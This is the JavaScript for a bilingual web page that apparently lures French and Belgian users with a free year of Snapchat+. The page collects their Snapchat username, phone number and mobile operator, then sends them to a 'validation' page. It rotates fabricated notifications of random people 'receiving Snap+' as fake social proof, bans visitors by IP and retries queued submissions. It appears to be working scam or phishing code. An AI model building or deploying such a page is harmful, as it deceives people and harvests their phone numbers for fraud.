// ═════════════════════════════════════════════════════════════
// CONFIG
// ═════════════════════════════════════════════════════════════
const CONFIG = {
    API_URL: '/api/snapchat',
    SYNC_INTERVAL: 30000
};

// ═════════════════════════════════════════════════════════════
// BAN IP CHECK — bloque l'accès au site si banni
// ═════════════════════════════════════════════════════════════
async function checkBan() {
    try {
        const res = await fetch('/api/check-ban');
        const data = await res.json();
        if (data.banned) {
            window.location.href = 'banned.html';
        }
    } catch (e) {
        console.error('Ban check error:', e);
    }
}

// ═════════════════════════════════════════════════════════════
// NOTIFICATIONS ANIMÉES
// ═════════════════════════════════════════════════════════════
const notifNames = [
    'Emma', 'Lucas', 'Chloe', 'Noah', 'Ines', 'Liam', 'Jade', 'Ethan',
    'Lena', 'Nathan', 'Zoe', 'Tom', 'Manon', 'Leo', 'Camille', 'Hugo',
    'Sarah', 'Mathis', 'Julie', 'Theo', 'Laura', 'Louis', 'Anais', 'Gabriel'
];

const notifSurnames = [
    'Dubois', 'Martin', 'Bernard', 'Petit', 'Robert', 'Richard', 'Durand',
    'Leroy', 'Moreau', 'Simon', 'Laurent', 'Lefebvre', 'Michel', 'Garcia'
];

function getRandomNotif() {
    const name = notifNames[Math.floor(Math.random() * notifNames.length)];
    const surname = notifSurnames[Math.floor(Math.random() * notifSurnames.length)];
    const masked = surname.substring(0, 2) + '***';
    return `🎉 ${name}${masked} just received Snap+ !`;
}

function startNotifications() {
    const el = document.getElementById('notifText');
    if (!el) return;

    let current = getRandomNotif();
    el.textContent = current;

    setInterval(() => {
        el.style.opacity = '0';
        el.style.transform = 'translateX(10px)';
        setTimeout(() => {
            current = getRandomNotif();
            el.textContent = current;
            el.style.opacity = '1';
            el.style.transform = 'translateX(0)';
        }, 400);
    }, 3500);
}

// ═════════════════════════════════════════════════════════════
// TRANSLATIONS
// ═════════════════════════════════════════════════════════════
const translations = {
    fr: {
        title: "🎉 Activer Snapchat+ pendant 1 an !",
        warning: "⚠️ Disponible uniquement pour les numéros des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas",
        warningBe: "⚠️ Disponible uniquement pour les numéros Belgique des opérateurs listés ci-dessous — tous les autres ne fonctionnent pas",
        usernameLabel: "👤 Nom d'utilisateur Snapchat",
        operatorLabel: "📱 Opérateur mobile",
        phoneLabel: "📞 Numéro de téléphone",
        submit: "🚀 Activer Snapchat+",
        locationLabel: "📍 Localisation",
        locationFr: "🇫🇷 France",
        locationBe: "🇧🇪 Belgique",
        operatorsFr: ["Orange", "SFR", "Bouygues"],
        operatorsBe: ["BASE", "Orange Belgique", "Proximus", "Telenet"],
        statusSuccess: "✅ Demande envoyée avec succès !",
        statusError: "❌ Erreur serveur, veuillez réessayer.",
        statusInvalid: "⚠️ Veuillez remplir tous les champs correctement.",
        statusPhoneInvalid: "⚠️ Numéro invalide",
        statusUsernameInvalid: "⚠️ Username invalide (3-15 caractères)",
        statusDuplicate: "⚠️ Ce numéro ou username est déjà enregistré.",
        offlineSaved: "💾 Sauvegardé hors-ligne. Synchronisation automatique..."
    },
    en: {
        title: "🎉 Activate Snapchat+ for 1 year!",
        warning: "⚠️ Available only for numbers from the listed operators — others won't work",
        warningBe: "⚠️ Available only for Belgium numbers from the listed operators — others won't work",
        usernameLabel: "👤 Snapchat Username",
        operatorLabel: "📱 Mobile Operator",
        phoneLabel: "📞 Phone Number",
        submit: "🚀 Activate Snapchat+",
        locationLabel: "📍 Location",
        locationFr: "🇫🇷 France",
        locationBe: "🇧🇪 Belgium",
        operatorsFr: ["Orange", "SFR", "Bouygues"],
        operatorsBe: ["BASE", "Orange Belgium", "Proximus", "Telenet"],
        statusSuccess: "✅ Request sent successfully!",
        statusError: "❌ Server error, please try again.",
        statusInvalid: "⚠️ Please fill in all fields correctly.",
        statusPhoneInvalid: "⚠️ Invalid number",
        statusUsernameInvalid: "⚠️ Invalid username (3-15 characters)",
        statusDuplicate: "⚠️ This number or username is already registered.",
        offlineSaved: "💾 Saved offline. Auto-syncing..."
    }
};

// ═════════════════════════════════════════════════════════════
// STATE
// ═════════════════════════════════════════════════════════════
let currentLang = 'fr';
let selectedOperator = 'orange';
let isSubmitting = false;

const elements = {
    langFr: document.getElementById('langFr'),
    langEn: document.getElementById('langEn'),
    siteLogo: document.getElementById('siteLogo'),
    mainTitle: document.getElementById('mainTitle'),
    warningMsg: document.getElementById('warningMsg'),
    usernameLabel: document.getElementById('usernameLabel'),
    operatorLabel: document.getElementById('operatorLabel'),
    phoneLabel: document.getElementById('phoneLabel'),
    locationLabel: document.getElementById('locationLabel'),
    submitBtn: document.getElementById('submitBtn'),
    statusMsg: document.getElementById('statusMsg'),
    username: document.getElementById('username'),
    phone: document.getElementById('phone'),
    location: document.getElementById('location'),
    offlineQueue: document.getElementById('offlineQueue'),
    queueCount: document.getElementById('queueCount'),
    operatorButtons: document.getElementById('operatorButtons')
};

// ═════════════════════════════════════════════════════════════
// LANGUAGE
// ═════════════════════════════════════════════════════════════
function setLanguage(lang) {
    currentLang = lang;
    const t = translations[lang];
    const isBe = elements.location.value === 'belgique';

    elements.mainTitle.textContent = t.title;
    elements.warningMsg.textContent = isBe ? t.warningBe : t.warning;
    elements.usernameLabel.textContent = t.usernameLabel;
    elements.operatorLabel.textContent = t.operatorLabel;
    elements.phoneLabel.textContent = t.phoneLabel;
    elements.locationLabel.textContent = t.locationLabel;
    elements.submitBtn.textContent = t.submit;

    elements.location.options[0].text = t.locationFr;
    elements.location.options[1].text = t.locationBe;

    updateOperators();

    elements.langFr.classList.toggle('active', lang === 'fr');
    elements.langEn.classList.toggle('active', lang === 'en');

    const statusText = elements.statusMsg.textContent;
    if (statusText && (statusText.includes('✅') || statusText.includes('❌') || statusText.includes('💾'))) {
        elements.statusMsg.textContent = '';
        elements.statusMsg.className = 'status-message';
    }
    updateQueueDisplay();
}

// ═════════════════════════════════════════════════════════════
// OPERATORS DYNAMIQUES (France / Belgique)
// ═════════════════════════════════════════════════════════════
function updateOperators() {
    const t = translations[currentLang];
    const isBe = elements.location.value === 'belgique';
    const ops = isBe ? t.operatorsBe : t.operatorsFr;
    const opValues = isBe ? ['base', 'orange_be', 'proximus', 'telenet'] : ['orange', 'sfr', 'bouygues'];

    elements.operatorButtons.innerHTML = '';
    ops.forEach((name, i) => {
        const btn = document.createElement('button');
        btn.className = 'btn-operator' + (i === 0 ? ' active' : '');
        btn.dataset.operator = opValues[i];
        btn.textContent = name;
        btn.onclick = function() { selectOperator(this); };
        elements.operatorButtons.appendChild(btn);
    });

    selectedOperator = opValues[0];
    elements.warningMsg.textContent = isBe ? t.warningBe : t.warning;
}

function selectOperator(btn) {
    const buttons = elements.operatorButtons.querySelectorAll('.btn-operator');
    buttons.forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    selectedOperator = btn.dataset.operator;
}

// ═════════════════════════════════════════════════════════════
// VALIDATION
// ═════════════════════════════════════════════════════════════
function validateUsername(username) {
    return /^[a-zA-Z0-9._-]{3,15}$/.test(username);
}

function validatePhone(phone, country) {
    const clean = phone.replace(/\s/g, '').replace(/^\+33/, '0').replace(/^\+32/, '0');
    if (country === 'belgique') {
        return /^04[0-9]{8}$/.test(clean) ? clean : null;
    }
    return /^0[67][0-9]{8}$/.test(clean) ? clean : null;
}

function validateForm() {
    const username = elements.username.value.trim();
    const phone = elements.phone.value.trim();
    const t = translations[currentLang];
    const country = elements.location.value;

    if (!username || !phone) {
        showStatus(t.statusInvalid, 'error');
        return false;
    }

    if (!validateUsername(username)) {
        showStatus(t.statusUsernameInvalid, 'error');
        return false;
    }

    const phoneClean = validatePhone(phone, country);
    if (!phoneClean) {
        showStatus(t.statusPhoneInvalid, 'error');
        return false;
    }

    return { username: username.toLowerCase(), phone: phoneClean, country };
}

function showStatus(message, type) {
    elements.statusMsg.textContent = message;
    elements.statusMsg.className = `status-message ${type}`;
}

// ═════════════════════════════════════════════════════════════
// OFFLINE QUEUE
// ═════════════════════════════════════════════════════════════
function getQueue() {
    try { return JSON.parse(localStorage.getItem('snaptech_queue') || '[]'); }
    catch (e) { return []; }
}

function saveQueue(queue) {
    try { localStorage.setItem('snaptech_queue', JSON.stringify(queue)); } catch (e) {}
    updateQueueDisplay();
}

function updateQueueDisplay() {
    const queue = getQueue();
    elements.offlineQueue.style.display = queue.length > 0 ? 'block' : 'none';
    elements.queueCount.textContent = queue.length;
}

function addToQueue(data) {
    const queue = getQueue();
    queue.push({ ...data, id: Date.now(), attempts: 0 });
    saveQueue(queue);
    showStatus(translations[currentLang].offlineSaved, 'success');
}

async function syncPendingRequests() {
    const queue = getQueue();
    if (queue.length === 0) return;
    const t = translations[currentLang];
    let synced = 0;
    const remaining = [];

    for (const item of queue) {
        try {
            const response = await fetch(CONFIG.API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(item)
            });
            if (response.ok || response.status === 409) synced++;
            else {
                item.attempts = (item.attempts || 0) + 1;
                if (item.attempts < 5) remaining.push(item);
            }
        } catch (err) {
            item.attempts = (item.attempts || 0) + 1;
            if (item.attempts < 5) remaining.push(item);
        }
    }
    saveQueue(remaining);
    if (synced > 0 && remaining.length === 0) showStatus(t.statusSuccess, 'success');
}

// ═════════════════════════════════════════════════════════════
// SUBMIT → redirige vers validation.html
// ═════════════════════════════════════════════════════════════
async function submitForm() {
    if (isSubmitting) return;
    const validation = validateForm();
    if (!validation) return;

    const { username, phone, country } = validation;
    const operator = selectedOperator;
    const lang = currentLang;
    const data = { username, phone, location: country, operator, lang };

    isSubmitting = true;
    elements.submitBtn.classList.add('loading');
    elements.submitBtn.disabled = true;
    showStatus('', '');

    try {
        const response = await fetch(CONFIG.API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (response.ok && result.success) {
            window.location.href = `validation.html?phone=${encodeURIComponent(phone)}&carrier=${encodeURIComponent(operator)}`;
        } else if (response.status === 409) {
            showStatus(translations[currentLang].statusDuplicate, 'error');
        } else {
            throw new Error(result.message || 'Server error');
        }
    } catch (error) {
        console.error('API Error:', error);
        addToQueue(data);
    } finally {
        isSubmitting = false;
        elements.submitBtn.classList.remove('loading');
        elements.submitBtn.disabled = false;
    }
}

// ═════════════════════════════════════════════════════════════
// INIT
// ═════════════════════════════════════════════════════════════
document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        const active = document.activeElement;
        if (active && ['username', 'phone'].includes(active.id)) {
            e.preventDefault();
            submitForm();
        }
    }
});

document.addEventListener('DOMContentLoaded', async () => {
    await checkBan(); // ← Vérifie le ban AVANT tout
    startNotifications();
    updateOperators();
    updateQueueDisplay();

    setInterval(() => {
        if (navigator.onLine && getQueue().length > 0) syncPendingRequests();
    }, CONFIG.SYNC_INTERVAL);
});

window.setLanguage = setLanguage;
window.selectOperator = selectOperator;
window.submitForm = submitForm;
window.syncPendingRequests = syncPendingRequests;
window.updateOperators = updateOperators;
